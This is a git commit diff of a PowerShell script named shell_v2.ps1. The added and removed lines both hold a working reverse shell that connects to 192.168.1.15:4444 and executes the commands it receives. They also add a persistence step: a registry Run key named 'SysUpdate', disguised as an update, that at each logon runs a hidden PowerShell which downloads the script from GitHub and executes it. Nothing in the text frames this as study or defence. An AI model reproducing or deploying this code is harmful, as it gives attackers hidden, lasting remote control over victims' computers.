22cb11a775e0451d0e83da8c29b2c4663ada7f50
B15cu1t <141248562+B15cu1t@users.noreply.github.com>
2026-03-17 23:23:37 +0100

    Update shell_v2.ps1
    Removed versioning and unnecessary comments, streamlined persistence setup.

--- shell_v2.ps1
+++ shell_v2.ps1
@@ -1,17 +1,5 @@
-# shell_v2.ps1 - WORKING VERSION WITH PERSISTENCE LOCKED IN
-# DO NOT CHANGE VERSION NUMBER OR pico COMMAND
+# shell_v2.ps1 - PERSISTENCE ONLY (3 lines)
+$regPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";$regName="SysUpdate";$regValue="powershell -w hidden -nop -WindowStyle Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1')\"";New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
 
-$LHOST = "192.168.1.15"
-$LPORT = 4444
-$SCRIPT_URL = "https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1"
-
-# Persistence ONLY (HKCU Run)
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "SysUpdate"
-$regValue = "powershell -w hidden -nop -WindowStyle Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('$SCRIPT_URL')\""
-New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
-
-# EXACT SAME WORKING SHELL FROM V2
-$client = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-
-while(1){}
+# YOUR WORKING SHELL (unchanged)
+$client = New-Object System.Net.Sockets.TCPClient("192.168.1.15",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
